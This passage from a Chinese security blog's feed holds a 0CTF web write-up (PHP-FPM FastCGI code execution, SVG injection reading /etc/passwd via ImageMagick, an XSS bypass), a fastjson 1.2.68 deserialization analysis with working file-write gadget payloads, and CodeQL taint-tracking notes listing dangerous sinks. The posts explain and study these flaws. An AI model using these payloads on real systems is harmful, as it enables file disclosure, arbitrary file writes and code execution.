class="string">$php_value = "allow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = php://input";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$params = array(       </span></span><br><span class="line"><span class="string">        'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',</span></span><br><span class="line"><span class="string">        'REQUEST_METHOD'    =&gt; 'POST',</span></span><br><span class="line"><span class="string">        'SCRIPT_FILENAME'   =&gt; '/var/www/html/index.php',</span></span><br><span class="line"><span class="string">        'SCRIPT_NAME'       =&gt; '/var/www/html/index.php',</span></span><br><span class="line"><span class="string">        'QUERY_STRING'      =&gt; 'command=ls',</span></span><br><span class="line"><span class="string">        'REQUEST_URI'       =&gt; $uri,</span></span><br><span class="line"><span class="string">        'DOCUMENT_URI'      =&gt; $req,</span></span><br><span class="line"><span class="string">        #'DOCUMENT_ROOT'     =&gt; '/',</span></span><br><span class="line"><span class="string">        'PHP_VALUE'         =&gt; $php_value,</span></span><br><span class="line"><span class="string">        'SERVER_SOFTWARE'   =&gt; 'asd',</span></span><br><span class="line"><span class="string">        'REMOTE_ADDR'       =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">        'REMOTE_PORT'       =&gt; '9985',</span></span><br><span class="line"><span class="string">        'SERVER_ADDR'       =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">        'SERVER_PORT'       =&gt; '80',</span></span><br><span class="line"><span class="string">        'SERVER_NAME'       =&gt; 'localhost',</span></span><br><span class="line"><span class="string">        'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',</span></span><br><span class="line"><span class="string">        'CONTENT_LENGTH'    =&gt; strlen($code)</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "Call: $uri\\n\\n";</span></span><br><span class="line"><span class="string">var_dump($client-&gt;request($params, $code));</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">ret = execute_php_code(code)</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><p>然后可以发现根目录的 <code>flag.so</code> 和 <code>flag.h</code>, 读取后 strings 一下就能读到 flag. 不过可以看到是与 ffi 有关的, 所以这做法应该是非预期了, 不过之后又上了个 noeasyphp 修了几个非预期解.<br>最后试了下用 ffi 拿 flag,  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi = FFI::load(<span class="string">"/flag.h"</span>);</span><br><span class="line">var_dump($ffi);</span><br><span class="line">var_dump($ffi-&gt;flag_fUn3t1on_fFi());</span><br></pre></td></tr></table></figure><p>也是能读到 flag 的, 不过这方法名和文件名是怎么预期得到呢, 猜测可能需要用 ffi 的功能去直接越界读内存? 感觉预期解更有意思一点.  </p><h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>大概功能如下: </p><ol><li>前端提交对话到后端, 后端返回生成的 svg 和对应的 id 到前端预览</li><li>前端提交 id 到后端, 渲染 svg 到图片</li></ol><p>问题出在生成, 有个功能是插入表情, 比如 <code>[cool]</code>, 会被替换为  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">x</span>=<span class="string">"1240"</span> <span class="attr">y</span>=<span class="string">"-60"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">xlink:href</span>=<span class="string">"http://pwnable.org:5000/static/emoji/cool"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>显然可能存在注入, 我们输入 <code>[cool&quot;&gt;&lt;a&gt;&lt;/a&gt;&lt;a href=&quot;]</code>, 就成功注入了 <code>&lt;a&gt;&lt;/a&gt;</code> 到 svg 里面. 这里可以想到之前空指针的一道题, imagemagick 在对 <code>text:/</code> 协议解析时, 会直接读取文件里的内容, 于是我们就能通过这个方式, 注入一个图片, 链接到 <code>text:/etc/passwd</code>, 之后就能通过后端渲染得到的图片, 得到文件内容.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line">d = <span class="string">'''</span></span><br><span class="line"><span class="string">[&#123;"type":0,"message":"Love you!&lt;a&gt;asd&lt;/a&gt;[cool\\"/&gt;&lt;image xlink:href=\\"text:/etc/passwd\\" x='-400px' y='400px' height='1500px' width='1500px'/&gt;&lt;a href=\\"]"&#125;,&#123;"type":1,"message":"Me too!!!"&#125;]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">res = sess.post(<span class="string">'http://pwnable.org:5000/preview'</span>, data=&#123;<span class="string">'data'</span>: d&#125;)</span><br><span class="line">svg = base64.b64decode(res.json()[<span class="string">'data'</span>][len(<span class="string">'data:image/svg+xml;base64,'</span>):])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.svg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(svg)</span><br><span class="line"></span><br><span class="line">pid = res.json()[<span class="string">'previewid'</span>]</span><br><span class="line">res = sess.post(<span class="string">'http://pwnable.org:5000/share'</span>, data=&#123;<span class="string">'previewid'</span>: pid&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>这里注意, 注入的内容前面一定要跟点东西, 不能直接这样 <code>[&quot;&gt;&lt;a&gt;&lt;/a&gt;&lt;a href=&quot;]</code>, 因为 <code>http://pwnable.org:5000/static/emoji/</code>, 返回的是 404, 而 <code>http://pwnable.org:5000/static/emoji/随意的内容</code> 返回的是微笑. 如果什么都没有, imagemagick 得到 404 的话, 解析会直接中止.  </p><p>现在就能读取文件了, 结合后端是 python, 然后一顿测试, 得到应用在 <code>/app/app.py</code>, 可惜这里因为 imagemagick 的问题, 能读的源码有限, 调大图片尺寸也只能得到放大的文字, 不能显示更多的文字.  </p><p>部分源码:  </p><p><img src="https://i.loli.net/2020/06/29/Gde8ry9uX3TKjR7.png" alt="">  </p><p>访问 <code>http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</code>, 然后题目一转 xss… 要求 alert(1).<br>因为这里有 csp 限制, 没法直接在 svg 里面用 script alert, 导致这里卡了挺久, 然后发现 imagemagick 生成的文件拓展名是可控的, 也就是第二步, 得到图片的路径是 <code>http://pwnable.org:5000/image/gzVIsH/png</code>, 修改最后的 png 到 svg, 就会如蜜传如蜜, 直接输出一张的 svg, 而且 content-type 也会改变. 不过这里后端限制了扩展名长度只能为 3, 否则会直接报错.<br>这里查看文档, 发现 imagemagick 是支持输出 htm 的, <code>http://pwnable.org:5000/image/gzVIsH/htm</code> 得到的就是 htm, content-type 也变成了 <code>text/html</code>. 于是 xss 思路就来了, 看到源码的过滤是直接替换为空, 可以用喜闻乐见的双写绕过.<br>然后在 svg 里面把最外面的 svg tag 给闭合了, 插入一个 html tag, 再用 meta 标签跳到我们的站上 alert(1) 即可, 这样就绕过了 csp.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="string">'''</span></span><br><span class="line"><span class="string">[&#123;"type":0,"message":"Love you!&lt;a&gt;asd&lt;/a&gt;[cool\\"/&gt;&lt;/g&gt;&lt;/svg&gt;&lt;html&gt;&lt;metmetaa http-equiv='refresh' content=\\"0;URL='http://site.com/'\\" /&gt;&lt;/html&gt;&lt;a href=\\"]"&#125;,&#123;"type":1,"message":"Me too!!!"&#125;]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>不过感觉可能也是非预期? 因为看源码还有个可控 callback name 的 jsonp 没用上.  </p><p>PS. 这里其实可以直接读 /proc/self/environ 来读环境变量, 可惜 imagemagick 碰到 \x00 就停止读取了, 导致只能读取第一个环境变量 PATH, 都不到后面的 flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
      <category term="0ctf" scheme="https://rmb122.com/tags/0ctf/"/>
    
  </entry>
  
  <entry>
    <title>fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记</title>
    <link href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/"/>
    <id>https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/</id>
    <published>2020-06-12T14:15:32.000Z</published>
    <updated>2020-08-10T13:46:51.505Z</updated>
    
    <content type="html"><![CDATA[<p>以此祭奠找 gadgets 逝去的青春, orz</p><a id="more"></a><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>既然已经出了补丁, 首先 diff 一下新版本与旧版本的差别, 这里因为 fastjson 会更新旧版本, 自然优先去 diff 旧版本的 sec 更新. 而不是去看 git log, 这样可以节省点时间, 因为 sec 更新只包含漏洞修补, 没有 feature 的更新.  </p><p>这里挑了 1.2.48 版本:<br><a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec09/" target="_blank" rel="noopener">https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec09/</a><br><a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec10/" target="_blank" rel="noopener">https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec10/</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ diff 1.2.48-sec09/com/alibaba/fastjson/parser/ParserConfig.java  1.2.48-sec10/com/alibaba/fastjson/parser/ParserConfig.java</span><br><span class="line">71a72</span><br><span class="line">&gt;     public static final String    SAFE_MODE_PROPERTY        = "fastjson.parser.safeMode";</span><br><span class="line">75a77</span><br><span class="line">&gt;     public static  final boolean  SAFE_MODE;</span><br><span class="line">87a90,93</span><br><span class="line">&gt;             String property = IOUtils.getStringProperty(SAFE_MODE_PROPERTY);</span><br><span class="line">&gt;             SAFE_MODE = "true".equals(property);</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt;         &#123;</span><br><span class="line">185a192</span><br><span class="line">&gt;     private boolean                                         safeMode               = SAFE_MODE;</span><br><span class="line">214a222,224</span><br><span class="line">&gt;                 0xD54B91CC77B239EDL,</span><br><span class="line">&gt;                 0xD59EE91F0B09EA01L,</span><br><span class="line">&gt;                 0xD8CA3D595E982BACL,</span><br><span class="line">244a255</span><br><span class="line">&gt;                 0x1CD6F11C6A358BB7L,</span><br><span class="line">273a285</span><br><span class="line">&gt;                 0x535E552D6F9700C1L,</span><br><span class="line">291c303,305</span><br><span class="line">&lt;                 0x7AA7EE3627A19CF3L</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;                 0x7AA7EE3627A19CF3L,</span><br><span class="line">&gt;                 0x7ED9311D28BF1A65L,</span><br><span class="line">&gt;                 0x7ED9481D28BF417AL</span><br><span class="line">497a512,519</span><br><span class="line">&gt;     public boolean isSafeMode() &#123;</span><br><span class="line">&gt;         return safeMode;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;     public void setSafeMode(boolean safeMode) &#123;</span><br><span class="line">&gt;         this.safeMode = safeMode;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt; </span><br><span class="line">1033a1056,1059</span><br><span class="line">&gt;         if (this.safeMode) &#123;</span><br><span class="line">&gt;             throw new JSONException("safeMode not support autoType : " + typeName);</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt; </span><br><span class="line">1038,1045c1064,1075</span><br><span class="line">&lt;             if (expectClass == Object.class</span><br><span class="line">&lt;                     || expectClass == Serializable.class</span><br><span class="line">&lt;                     || expectClass == Cloneable.class</span><br><span class="line">&lt;                     || expectClass == Closeable.class</span><br><span class="line">&lt;                     || expectClass == EventListener.class</span><br><span class="line">&lt;                     || expectClass == Iterable.class</span><br><span class="line">&lt;                     || expectClass == Collection.class</span><br><span class="line">&lt;                     ) &#123;</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;             long expectHash = TypeUtils.fnv1a_64(expectClass.getName());</span><br><span class="line">&gt;             if (expectHash == 0x90a25f5baa21529eL</span><br><span class="line">&gt;                     || expectHash == 0x2d10a5801b9d6136L</span><br><span class="line">&gt;                     || expectHash == 0xaf586a571e302c6bL</span><br><span class="line">&gt;                     || expectHash == 0xed007300a7b227c6L</span><br><span class="line">&gt;                     || expectHash == 0x295c4605fd1eaa95L</span><br><span class="line">&gt;                     || expectHash == 0x47ef269aadc650b4L</span><br><span class="line">&gt;                     || expectHash == 0x6439c4dff712ae8bL</span><br><span class="line">&gt;                     || expectHash == 0xe3dd9875a2dc5283L</span><br><span class="line">&gt;                     || expectHash == 0xe2a8ddba03e69e0dL</span><br><span class="line">&gt;                     || expectHash == 0xd734ceb4c3e9d1daL</span><br><span class="line">&gt;             ) &#123;</span><br></pre></td></tr></table></figure><p>明显看到 expectClass 的判断出了变化, 甚至加了层 hash, 有种此地无银三百两的味道 233.<br>这里修改下 fastjson-blacklist, 改成用 <code>TypeUtils.fnv1a_64</code> 来计算 hash, 可以得到新增了三个类型的判断, <code>java.lang.AutoCloseable</code>, <code>java.lang.Readable</code>, <code>java.lang.Runnable</code>.  </p><p>这里稍微跟了下程序, 发现 expectClass 的作用其实相当于一个临时白名单, 这里有两个特性:  </p><ol><li>比如有个  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Face</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">Face</span> </span>&#123;</span><br><span class="line">    String aaa;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAaa</span><span class="params">(String aaa)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.aaa = aaa;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    Face test;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(Face test)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.test = test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>那么通过 <code>JSON.parseObject(&quot;{\&quot;test\&quot;:{\&quot;@type\&quot;: \&quot;Test\&quot;, \&quot;aaa\&quot;: \&quot;zz\&quot;}}&quot;, Test2.class);</code> 是可以反序列化的, fastjson 会对当前反序列化类的 field 的类型作为 type 传进 <code>JavaBeanDeserializer.deserialze</code>. 最后成为 expectClass 代入 checkAutoType 中, 如果 @type 指定的类是 expectClass 的子类, 就可以在黑名单不禁止的情况下通过检查, 这样就可以为 interface 制定类.  </p><ol start="2"><li>还有一个特性, 那就是会直接为 field 创建 JavaBeanDeserializer, 这个更强一些, 无视黑名单以及白名单, 但是前提有一个类的 field (或者 setter) 使用了才行. 比如:  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    java.lang.Thread test;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(java.lang.Thread test)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.test = test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><code>JSON.parseObject(&quot;{\&quot;test\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Thread\&quot;}}&quot;, Test2.class);</code> 会直接将 Thread 反序列化, 无视了黑名单 (实际上直接绕过了 checkAutoType, SafeMode 下依然可以反序列化), 但这个明显鸡肋很多, 毕竟那些危险类一般情况下都是没用的. 没人会作为 filed 来使用.  </li></ol><p>这次漏洞也是因为特性 1 的原因. 但还有一个原因才能导致漏洞, 那就是 AutoCloseable 是在内置的反序列化 classMappings 中的, 没错, 就是之前缓存绕过 autoType 的那个 mapping. 所以导致了 AutoCloseable 是能直接被反序列化的, 这里可以根据特性一, 构造</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.lang.AutoCloseable"</span>,</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.io.FileOutputStream"</span>,</span><br><span class="line">    <span class="attr">"file"</span>: <span class="string">"/tmp/asdasd"</span>,</span><br><span class="line">    <span class="attr">"append"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样可以直接绕过 autoType 的检查, 得到 java.io.FileOutputStream, 此处是直接用 <code>&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</code> 构造出了 JavaBeanDeserializer, 而不是跟上面的例子一样通过 filed 的方式. 相信看到这里, 就已经有想法了, 可以通过 AutoCloseable 的子类来完成相关的攻击.  </p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>修复方式从上面的 diff 中可以看出是在原来的基础上加了几个, 实际上可以看到原来本身就是有防御的, 因为有些内置类是以 Object 作为 setter, 构造函数的参数类型的, 如果不 ban 掉, 就可以直接反序列化任意类了. 这次的漏洞更像是某种意义上的黑名单被绕过, 不过可以看到 AutoCloseable 是 Closeble 的父类, 不知道为什么会在 Closeble 已经被 ban 掉的情况下忘记添加 AutoCloseable, 可能是忘记了? 233</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里分享一条我找到的不需要三方库的链, 注意虽然不需要三方库, 但只能在 openjdk &gt;= 11 下利用, 因为只有这些版本没去掉符号信息. fastjson 在类没有无参数构造函数时, 如果其他构造函数是有符号信息的话也是可以调用的, 所以可以多利用一些内部类, 但是 openjdk 8, 包括 oracle jdk 都是不带这些信息的, 导致无法反序列化, 自然也就无法利用. 所以相对比较鸡肋, 仅供学习. orz  </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.lang.AutoCloseable"</span>,</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"sun.rmi.server.MarshalOutputStream"</span>,</span><br><span class="line">    <span class="attr">"out"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.util.zip.InflaterOutputStream"</span>,</span><br><span class="line">        <span class="attr">"out"</span>: &#123;</span><br><span class="line">           <span class="attr">"@type"</span>: <span class="string">"java.io.FileOutputStream"</span>,</span><br><span class="line">           <span class="attr">"file"</span>: <span class="string">"/tmp/asdasd"</span>,</span><br><span class="line">           <span class="attr">"append"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"infl"</span>: &#123;</span><br><span class="line">           <span class="attr">"input"</span>: &#123;</span><br><span class="line">               <span class="attr">"array"</span>: <span class="string">"eJxLLE5JTCkGAAh5AnE="</span>,</span><br><span class="line">               <span class="attr">"limit"</span>: <span class="number">14</span></span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"bufLen"</span>: <span class="string">"100"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"protocolVersion"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致思路是从上面已经写出来的 FileOutputStream 开始, 找到一个能往里面指定写入内容的类, 这里要一次传入两个参数, 所以只能通过构造函数或者两个 setter 来设置, 比较尴尬的是没有找到可以直接触发的, 还需要再调用一次 write/close/flush 才能真正写入内容, 最后又找到了 <code>sun.rmi.server.MarshalOutputStream</code>, 可以写入不可控内容, 才真正完成 exp.  </p><p>这里可以通过反射来暴力搜索函数相关参数, 加快搜索过程, 但也是很麻烦的 orz</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以此祭奠找 gadgets 逝去的青春, orz&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Codeql 踩坑记录 (二)</title>
    <link href="https://rmb122.com/2020/03/31/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-%E4%BA%8C/"/>
    <id>https://rmb122.com/2020/03/31/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-%E4%BA%8C/</id>
    <published>2020-03-31T15:06:52.000Z</published>
    <updated>2020-05-29T10:52:52.200Z</updated>
    
    <content type="html"><![CDATA[<p>首先需要解决的就是上次留下的问题, 添加自定义的 taint track.<br>在自带的 tests 中就有示例, 可以参考 <code>ql/python/ql/test/library-tests/taint/extensions/ExtensionsLib.qll</code>  </p><a id="more"></a><p>最后大概是这样  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class AnyCallFlow extends DataFlowExtension::DataFlowNode &#123;</span><br><span class="line">     AnyCallFlow() &#123;</span><br><span class="line">         exists(CallNode call |</span><br><span class="line">            call.getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">         )</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     override ControlFlowNode getASuccessorNode() &#123;</span><br><span class="line">         result.(CallNode).getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思就是如果一个 funccall 中是 val.attr 类型的, 且 val 被 taint 了, 那么整个 CallNode 都将被 taint.<br>然后加到 Configuration 里面就可以了  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isExtension(TaintTracking::Extension extension) &#123;</span><br><span class="line">    extension instanceof AnyCallFlow</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时就能够识别 split 等方法了, 不过这样的结果肯定是增加误报率了.<br>这里插一句, 最近在看南大开在 B 站上的软件分析课程, 讲的挺好, 这里其实就是 soundness completeness 问题, 在安全这一块还是 soundness 好一点, 所以最好还是牺牲虚警率来提高漏报率吧.  </p><p>最后按照官方库的方法, 封装一下, 最后的结果  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line">import semmle.python.security.TaintTracking</span><br><span class="line">import semmle.python.web.flask.Request</span><br><span class="line"></span><br><span class="line">class AnyCallFlow extends DataFlowExtension::DataFlowNode &#123;</span><br><span class="line">     AnyCallFlow() &#123;</span><br><span class="line">         exists(CallNode call |</span><br><span class="line">            call.getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">         )</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     override ControlFlowNode getASuccessorNode() &#123;</span><br><span class="line">         result.(CallNode).getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DangerousFunctionArg0 extends Value &#123;</span><br><span class="line">    DangerousFunctionArg0() &#123;</span><br><span class="line">        exists(Value val |</span><br><span class="line">            this &#x3D; val and</span><br><span class="line">            (</span><br><span class="line">                val &#x3D; Value::named(&quot;subprocess.check_output&quot;) or</span><br><span class="line">                val &#x3D; Value::named(&quot;os.system&quot;) or </span><br><span class="line">                val &#x3D; Value::named(&quot;os.popen&quot;) or </span><br><span class="line">                val &#x3D; Value::named(&quot;eval&quot;) or </span><br><span class="line">                val &#x3D; Value::named(&quot;exec&quot;) or</span><br><span class="line">                val &#x3D; Value::named(&quot;flask.render_template_string&quot;)</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span 